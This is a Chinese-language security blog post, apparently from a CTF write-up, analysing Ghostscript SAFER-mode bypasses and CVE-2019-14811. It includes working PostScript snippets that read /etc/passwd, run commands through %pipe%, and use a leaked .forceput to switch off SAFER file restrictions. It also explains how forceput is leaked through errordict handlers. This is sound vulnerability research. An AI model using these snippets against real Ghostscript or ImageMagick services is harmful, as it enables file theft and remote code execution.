@@ -1,0 +1,134 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="9e2a75e9cfaac740e7b8e55847822165">前言</h2>
+<p>在Tokyo Western CTF2019之前，我对postscript处于基本0知识的状态。赛后，为了看懂官方给的poc，我大概花了一周的时间对着九百多页的官方文档学习了一下这门语言（它有关的学习资料太少了Orz），以及围绕它SAFER模式展开的攻防博弈。即使是现在，我对于postscript仍处于懵懂的愚昧状态。因此，如果下文中有任何不对的地方，希望大家理解并指出，感谢大佬们给与宝贵经验。</p>
+<h2 data-content="1" id="89262b191082eb55864a9a72bf961735">postscript语言简介</h2>
+<p>postscript是Adobe提出的一种打印机语言，ghostscript可以看做是postscript的一个解释器，它实现了postscript的语言标准，同时附加了一些其独有的操作指令。postscript语法最大的特点就是逆波兰表示法，也就是后缀表示。对于最常见的<code>1 add 1</code>的中缀表达来说，postscript中的表达就是<code>1 1 add</code>。postscript中变量的定义是以<code>/</code>开头的，你可以把它看做php里面的<code>$</code>。比如定义一个变量a，<code>/a 1 def</code>。postscript用<code>{}</code>来包裹一个过程，类似于函数，比如<code>/inc {1 1 add ==} def</code>。postscript采用字典栈的概念来保存各种系统自带的变量和操作符（systemdict）以及用户自定义的操作符和变量（userdict），因为postscript会根据栈的顺序在字典中寻找变量，因此字典栈相当于赋予了变量作用域的概念。</p>
+<h2 data-content="1" id="ebdc16e195ea7864694fdb6707d34485">postscript文件操作能力</h2>
+<p>虽说postscript只是一种打印机语言，但是它在定义的时候就具备了比较强大的文件操作能力。关于postscript的文件操作符，在Adobe官方的文档中就有一页多的相关描述。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919222811-b57cc63e-dae9-1.png"/></p>
+<p>利用file和readstring命令，我们可以轻松的完成对于任意文件的读取操作。</p>
+<pre><code>(/etc/passwd) (r) file 65536 string readstring == ==</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919222909-d7c35000-dae9-1.png"/></p>
+<p>利用filenameforall可以轻松完成列目录的操作</p>
+<pre><code>(/etc/*) {==} 65536 string filenameforall</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919223033-09d7b112-daea-1.png"/></p>
+<p>同时，ghostscript还支持在文件操作中采用pipe的方式来进程IO的操作，也就是我们可以利用file命令来实现任意的命令执行，当然这只在Unix系统中才生效。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919223128-2aeac650-daea-1.png"/></p>
+<pre><code>(%pipe%id) (r) file 65536 string readstring == ==</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919223205-409de91e-daea-1.png"/></p>
+<h2 data-content="1" id="8157c062bacea6a7916abc022025d9a8">ghostscript SAFER模式</h2>
+<p>基于以上强大的文件操作能力，ghostscript采用了SAFER模式的方式来增加对文件系统的访问控制权限，采用<code>-dSAFER</code>的形式启动即可开启防护。</p>
+<p>在imagemagick的delegates.xml中我们可以看到对于ghostscript的调用都是采用SAFER模式来调用的。</p>
+<pre><code>&lt;delegate xmlns="" decode="ps" encode="eps" mode="bi" command=""gs" -sstdout=%%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 "-sDEVICE=eps2write" "-sOutputFile=%o" "-f%i""/&gt;</code></pre>
+<p>在这个<a href="https://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=79a06b45e784e6839b2b2129cd2620ea606254e1;hp=9883f2a931407503778bb94948b47480eff858b2" target="_blank">patch</a>发布之前，我们可以看看ghostscript是采用什么方式来实现SAFER模式的。</p>
+<p>我们可以在这个<a href="https://github.com/ArtifexSoftware/ghostpdl-downloads" target="_blank">repo</a>中下载到相关的release版本。</p>
+<p>SAFER模式在<code>Resource/Init/gs_init.ps</code>中定义</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919223401-85f52d2e-daea-1.png"/></p>
+<p>核心的.locksafe方法主要做的事情是限制了userparams参数以及device的参数。其中的.locksafe_userparams方法严格限制了文件读写以及控制权限，同时通过LockFilePermissions这个值使得三个权限属性不能再被修改。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919223459-a83c4200-daea-1.png"/></p>
+<p>一段时间内，这种SAFER模式使得ghostscript变得安全起来，不会被任意的进行文件操作。</p>
+<p>这个时候，我们再回头看上文提到说这是在这个<a href="https://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=79a06b45e784e6839b2b2129cd2620ea606254e1;hp=9883f2a931407503778bb94948b47480eff858b2" target="_blank">patch</a>之前的SAFER模式，现在去翻阅ghostscript文档中对于<code>-dSAFER</code>的描述，我们可以发现这是一种完全崭新的SAFER模式，而我们刚刚看到的则变成了<code>-dOLDSAFER</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919223654-eccd93f6-daea-1.png"/></p>
+<p>我把这看作是ghotscript前世今生的分界点，而导致其重新设计自己安全模式的是来自Google Project Zero的安全研究人员Tavis Ormandy。（太强了，顶不住啊Orz）</p>
+<h2 data-content="1" id="179a696e635203921a0523dfdaa30ce6">Taviso的SAFER bypass之旅</h2>
+<p>我在 <a href="https://bugs.chromium.org/" target="_blank">https://bugs.chromium.org/</a> 上一共找到了六个Taviso提交的关于ghostscript的issue。分别是</p>
+<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1640" target="_blank">https://bugs.chromium.org/p/project-zero/issues/detail?id=1640</a></p>
+<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1675" target="_blank">https://bugs.chromium.org/p/project-zero/issues/detail?id=1675</a></p>
+<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1682" target="_blank">https://bugs.chromium.org/p/project-zero/issues/detail?id=1682</a></p>
+<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1690" target="_blank">https://bugs.chromium.org/p/project-zero/issues/detail?id=1690</a></p>
+<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1696" target="_blank">https://bugs.chromium.org/p/project-zero/issues/detail?id=1696</a></p>
+<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1729" target="_blank">https://bugs.chromium.org/p/project-zero/issues/detail?id=1729</a></p>
+<p>通过这六个issue，我们可以慢慢了解ghostscript为何需要重新设计一种SAFER模式。</p>
+<p>在#1640中，Taviso主要总结了他之前发现的几个ghostscript的小问题，这些bypass主要是由于SAFER设计时由于postscript定义的自带指令太多而考虑不周引起的绕过，不是本文的重点内容，这在这篇文章 <a href="https://paper.seebug.org/68/" target="_blank">https://paper.seebug.org/68/</a> 中也可以看到相关的内容。（另外和内存破坏相关的漏洞由于我还只是一只弱小的web狗，也不再这里展开去分析了Orz）</p>
+<p>从#1675开始，Taviso给我们带来一个崭新的bypass SAFER的思路。这和一个命令息息相关，也就是forceput命令。forceput是一个在postscript官方文档中找不到的，ghostscript设计的命令。它具有和put一样的效果就是个字典中的某项赋值，却拥有远超put的能力，那就是无视权限。官方的定义如下。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919224201-a42321ce-daeb-1.png"/></p>
+<p>那么如果我们拥有了forceput，我们如何绕过SAFER呢？？？不用绕过，我们可以完全禁止SAFER。</p>
+<p>从上文对.locksafe的分析出发，我们只要对应的将userparams的参数还原，即可逃出SAFER。</p>
+<pre><code>systemdict /SAFER false .forceput
+userparams /LockFilePermissions false .forceput
+userparams /PermitFileControl [(*)] .forceput
+userparams /PermitFileWriting [(*)] .forceput
+userparams /PermitFileReading [(*)] .forceput
+save restore</code></pre>
+<p>因为forceput及其强大，它本来并不会暴露给用户来使用这个命令。然而，虽然我们无法直接地调用forceput命令，但是在ghostscript内置的命令中，存在有很多的过程包含了forceput命令。</p>
+<p>而这也是#1675中提到的：一个过程的定义，在字典栈中是以一个数组的形式存放的，我们可以通过pop弹出栈顶元素的方式，获得过程中的某个元素，如果forceput被包含在了一个我们可以访问的命令中时，我们就可以用这种方式来泄露它。</p>
+<p>当然，ghostscript的开发人员不可能蠢到完全想不到这样的场景，所以通常他们会采用executeonly的方式来保护敏感的操作。executeonly相当于标志位的感觉，使得被其标志的代码块只能被执行，不能被读写。</p>
+<p>然后Taviso想到了一种绕过这种防御的方法，这里需要引入两个新的字典，errordict和$error。errordict是用来存放错误处理函数的字典，也就是对各种exception的处理方法的集合。当错误发生时，ghostscript会将错误的相关信息放置在$error字典中，其中ostack中存放有操作命令的栈，也就是一个过程在执行时，会把其中的操作在栈上展开，而当其中发生了错误或者使用了stop时，就会在此处抛出error，同时将整个操作栈复制到$error的ostack中，由errordict中的对应handle去处理这个错误。</p>
+<p>针对这种攻击，ghostscript提出了patch的手段 <a href="http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=fb713b3818b" target="_blank">http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=fb713b3818b</a> 。不再允许用户自己定义error handle到errordict中，但是这个修复并没有禁止用户修改errordict中原生的错误处理过程。</p>
+<p>我们可以通过以下手段来dump各种字典。</p>
+<pre><code>errordict {exch ==only ( ) print ===} forall quit</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919224439-02636eec-daec-1.png"/></p>
+<p>由于ghostscript允许修改原生的这些error handle，因此我们可以通过修改这些error然后在存在forceinput的过程中精准触发error的方法来完成对forceput的泄漏。</p>
+<p>这也是Taviso接下来的几个issue中提到的主要内容。</p>
+<p>接下来，我通过对Tokyo Western在今年ctf中对于CVE-2019-14811 exp的编写为例，来具体解释上述提到的攻击方法。原始的poc可以参考<a href="https://gist.github.com/hhc0null/82bf2e57ac93c1a48115a1b4afcde706" target="_blank">https://gist.github.com/hhc0null/82bf2e57ac93c1a48115a1b4afcde706</a></p>
+<p>我把不需要的部分去除，只留下比较精简的部分放在了这里：<a href="https://gist.github.com/rebirthwyw/d401fc375620d4497cc993045736a168" target="_blank">https://gist.github.com/rebirthwyw/d401fc375620d4497cc993045736a168</a> ，接下来也会以这个poc为依据来解释。</p>
+<h2 data-content="1" id="422f5cf26566afd768a8017e376a2797">CVE-2019-14811 分析</h2>
+<p>首先我们确定在.pdf_hook_DSC_Creator存在有forceput指令。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919224626-41b1726a-daec-1.png"/></p>
+<p>由于.pdf_hook_DSC_Creator命令也无法直接被我们使用，因此需要从.pdfdsc中先提取出.pdf_hook_DSC_Creator。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919224712-5d36d7e6-daec-1.png"/></p>
+<p>{}包裹的作为一个元素，所以可以发现.pdf_hook_DSC_Creator是第25个元素，因为过程在栈上是作为数组展开的，因此只要<code>systemdict /.pdfdsc get 24 get</code>即获得了.pdf_hook_DSC_Creator的一个引用。</p>
+<p>关注.pdf_hook_DSC_Creator的逻辑，当你调用<code>null .pdf_hook_DSC_Creator</code>时，会在<code>/Creator .knownget</code>处发生第一次<code>/typecheck</code>的error，然后在<code>(PScript5.dll) search</code>处发生第二次<code>/typecheck</code>的error。具体的说，可以通过修改errordict对于<code>/typecheck</code>的处理来判断。</p>
+<p>比如这样的方法</p>
+<pre><code>/typecheckcount 0 def
+errordict /typecheck {
+  /typecheckcount typecheckcount 1 add def
+  typecheckcount 1 eq {
+    ==
+  } if
+  typecheckcount 2 eq {
+    == ==
+  } if
+} put</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919224816-8346f538-daec-1.png"/></p>
+<p>可以看到<code>/typecheck</code>的error处理已经被改变。</p>
+<p>在<code>(PScript5.dll) search</code>处发生第二次<code>/typecheck</code>的error时，我们可以看到栈上的内容是这样的</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919224858-9c82d864-daec-1.png"/></p>
+<pre><code>{(PScript5.dll) --search-- {--pop-- --pop-- systemdict /resourcestatus --dup-- {--dup-- /FontType --eq-- 2 --index-- 32 --eq-- --and-- {--pop-- --pop-- false} {--resourcestatus--} --ifelse--} --bind-- --.makeoperator-- --.forceput-- systemdict /.pdf_hooked_DSC_Creator true --.forceput--} --executeonly-- --if-- --pop--}</code></pre>
+<p>首先，上述的内容是栈上的第二部分内容（第二个==的输出）。</p>
+<pre><code>{--pop-- --pop-- systemdict /resourcestatus --dup-- {--dup-- /FontType --eq-- 2 --index-- 32 --eq-- --and-- {--pop-- --pop-- false} {--resourcestatus--} --ifelse--} --bind-- --.makeoperator-- --.forceput-- systemdict /.pdf_hooked_DSC_Creator true --.forceput--}</code></pre>
+<p>这是第二部分内容中的第三段，｛｝中的内容是看做一部分的，因此<code>--.forceput--</code>是这段内容的第九个。</p>
+<p>所以我们可以通过<code>1 index 2 get 8 get</code>来获得栈上的<code>--.forceput--</code>。</p>
+<p>poc的第一部分获取forceput到此结束，第二部分在前面已经提过了就是重新设置userparams的文件访问控制参数。</p>
+<p>最后一部分就是命令执行的部分，这在前文也已经提过了，就是采用了file可以使用pipe的方式来完成的。</p>
+<p>通过CVE-2019-14811，我们可以明白，只要有某一个分支中存在没有被设置为executeonly的forceput命令，我们就可以通过触发errordict中存在的error handle来泄漏forceput命令。</p>
+<p>正因如此，我们通过Taviso的issue可以发现，ghostscript官方提供的patch多次被他绕过，无法完全根除这样的问题。</p>
+<p>而这也促使ghostscript官方完全更新了自己的SAFER模式，通过这种方式来进行防御。</p>
+<h2 data-content="1" id="eb8fe0db31039c7ca2c5ed64a08857f2">现在的ghostscript</h2>
+<p>打开最新版本的ghostscript的源码，我们可以发现，如今的SAFER模式采用了以下方式来防御（代码在<code>Resource/Init/gs_init.ps</code>）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919225034-d60e716a-daec-1.png"/></p>
+<p>如今采用<code>/.lockfileaccess</code>来设置SAFER模式，现在的<code>.addcontrolpath</code>直接将访问控制权限中的路径设置在了全局的结构体中，不再采用userparams来是设置访问控制参数。同时，<code>.activatepathcontrol</code>起到了锁的作用，只要它被启用后，再采用<code>.addcontrolpath</code>就会直接退出解释器。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919225145-005a4444-daed-1.png"/></p>
+<p>我们可以在源码中轻松地看到<code>addcontrolpath</code>改动了结构体的一个变量的值。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919225241-218f2152-daed-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919225332-3fe51a4e-daed-1.png"/></p>
+<p>因此，除非能修改到这个标志位，我们无法再对文件的访问控制再做任何的修改。</p>
+<p>如果要验证你当前的ghostscript版本是否已经启用了新的SAFER（新版本的ghostscript默认就会启用SAFER模式），你只需要尝试调用<code>.addcontrolpath</code>命令即可。</p>
+<pre><code>[ (/tmp) ] {/PermitFileWriting exch .addcontrolpath} forall</code></pre>
+<p>貌似在当前的ubuntu和debian中都还没有更新ghostscript的这个新的SAFER，我在docker中拉去最新的ubuntu和debian都未成功触发直接退出解释器的情形。</p>
+<h2 data-content="1" id="eef2870197546299f3ac87c8d1be43ab">imagemagick解析</h2>
+<p>Tokyo Western的ctf中采用了官网推荐方式来实现对ps解释器的限制。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919225435-651e443e-daed-1.png"/></p>
+<p>众所周知，imagemagick采用读取文件头的方式来判断文件采用什么方式去解析这个文件，如果查看delegates.xml，的确会发现对应采用ps解释器的文件类型都被禁止了。但是如果你去看看 <a href="https://imagemagick.org/script/formats.php" target="_blank">https://imagemagick.org/script/formats.php</a> 中对于格式的详细说明，就会发现还有很多漏网之鱼。通过<code>identify -list format</code>命令可以快速查找所有的支持格式。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190919225527-845f24ee-daed-1.png"/></p>
+<h2 data-content="1" id="7201884e49046332c37b1dfc28068a3e">后记</h2>
+<p>本来是想学习一下ghostscript的这一些漏洞看看还有没有漏网之鱼的，但是按照最新的SAFER的防御机制，单纯利用ghostscript逻辑来实现SAFER模式绕过可能无法完成了。如果还想绕过SAFER，可能要尝试通过type confusion之类的手段来修改上述的结构体才有可能实现，比如<a href="https://blog.semmle.com/cve-2018-19134-ghostscript-rce/" target="_blank">这篇文章</a>的做法，虽说他为了方便最后也是控制的forceput命令。</p>
+<h2 data-content="1" id="bf8c2690a8027dd402d43a5f47fb12c0">参考链接</h2>
+<p><a href="https://paper.seebug.org/68/" target="_blank">https://paper.seebug.org/68/</a></p>
+<p><a href="https://paper.seebug.org/310/" target="_blank">https://paper.seebug.org/310/</a></p>
+<p><a href="https://www.ghostscript.com/doc/current/Language.htm" target="_blank">https://www.ghostscript.com/doc/current/Language.htm</a></p>
+<p><a href="https://bugs.ghostscript.com/show_bug.cgi?id=699708" target="_blank">https://bugs.ghostscript.com/show_bug.cgi?id=699708</a></p>
+<p><a href="https://blog.semmle.com/cve-2018-19134-ghostscript-rce/" target="_blank">https://blog.semmle.com/cve-2018-19134-ghostscript-rce/</a></p>
+<p><a href="https://www-cdf.fnal.gov/offline/PostScript/PLRM3.pdf" target="_blank">https://www-cdf.fnal.gov/offline/PostScript/PLRM3.pdf</a></p>
+<p><a href="https://gist.github.com/hhc0null/82bf2e57ac93c1a48115a1b4afcde706" target="_blank">https://gist.github.com/hhc0null/82bf2e57ac93c1a48115a1b4afcde706</a></p>
+<p><a href="https://imagemagick.org/script/formats.php" target="_blank">https://imagemagick.org/script/formats.php</a></p>
+<p><a href="https://imagemagick.org/script/security-policy.php" target="_blank">https://imagemagick.org/script/security-policy.php</a></p>
+<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1640" target="_blank">https://bugs.chromium.org/p/project-zero/issues/detail?id=1640</a></p>
+<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1675" target="_blank">https://bugs.chromium.org/p/project-zero/issues/detail?id=1675</a></p>
+<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1682" target="_blank">https://bugs.chromium.org/p/project-zero/issues/detail?id=1682</a></p>
+<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1690" target="_blank">https://bugs.chromium.org/p/project-zero/issues/detail?id=1690</a></p>
+<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1696" target="_blank">https://bugs.chromium.org/p/project-zero/issues/detail?id=1696</a></p>
+<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1729" target="_blank">https://bugs.chromium.org/p/project-zero/issues/detail?id=1729</a></p>
+</div>
+</div>
